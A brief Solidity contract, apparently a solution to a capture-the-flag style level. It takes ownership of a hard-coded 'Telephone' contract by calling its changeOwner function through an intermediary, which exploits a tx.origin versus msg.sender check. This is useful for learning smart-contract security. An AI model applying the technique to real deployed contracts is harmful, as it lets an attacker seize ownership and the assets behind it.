pragma solidity ^0.8.7;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract Counter {
    address private constant telephoneAddress = 0x6179BFC262585FD6Fa2923aEA948DB2A911c37AE;
    Telephone constant telephone = Telephone(telephoneAddress);

    constructor() public {}

    function changeOwner(address _owner) public {
      telephone.changeOwner(_owner);        
    }
}